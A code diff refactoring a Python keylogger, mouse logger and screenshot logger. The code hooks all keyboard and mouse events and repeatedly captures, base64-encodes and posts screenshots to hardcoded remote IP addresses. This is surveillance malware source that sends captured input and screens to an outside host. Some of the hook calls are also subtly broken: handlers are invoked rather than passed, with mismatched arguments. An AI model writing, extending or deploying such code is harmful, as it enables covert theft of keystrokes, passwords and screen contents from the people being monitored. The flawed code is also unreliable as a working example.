@@ -17,7 +17,9 @@ import pyHook
 import pythoncom
 
 class MonitorLogger(object):
-    pass
+    def __init__(self, ip = '202.100.1.224', port = 5000) -> None:
+        self.ip = ip
+        self.port = port
 
 class KeyMouseLogger(object):
     """
@@ -26,6 +28,9 @@ class KeyMouseLogger(object):
     Usage:
         python monitor_logger.py key_mouse_logger
     """
+    def __init__(self):
+        self.client = FlaskClient
+
     def OnKeyboardEvent(self, ip, event, client):
         key_board_event = {
             'MessageType':'KeyboardEvent',
@@ -47,11 +52,10 @@ class KeyMouseLogger(object):
         return True
     
     def key_mouse_logger(self, ip = '202.100.1.224'):
-        client = FlaskClient
         hm = pyHook.HookManager() # create a hook manager
-        hm.KeyDown = self.OnKeyboardEvent(ip, client) # watch for all keyboard events
+        hm.KeyDown = self.OnKeyboardEvent(ip, self.client) # watch for all keyboard events
         hm.HookKeyboard() # set the hook
-        hm.MouseAll = self.OnMouseEvent(ip, client) # watch for all mouse events
+        hm.MouseAll = self.OnMouseEvent(ip, self.client) # watch for all mouse events
         hm.HookMouse() # set the hook
         pythoncom.PumpMessages() # wait forever
 
@@ -73,6 +77,9 @@ class ScreenShotter(object):
     Usage:
         python monitor_logger.py screenshotter_logger
     """
+    def __init__(self):
+        self.client = FlaskClient
+
     def img_b64(self, img):
         b4code = base64.b64encode(img)
         str_b4code = str(b4code)[2:-1]
@@ -106,11 +113,10 @@ class ScreenShotter(object):
         client.http_post_json(ip, dict_key)
 
     def screenshotter_logger(self, ip = '202.100.1.24'):
-        client = FlaskClient
         while True:
             time.sleep(1)
             self.screenshotter()
-            self.screenshotter_read(ip, client)
+            self.screenshotter_read(ip, self.client)
 
 
 event_json = '/server_json'
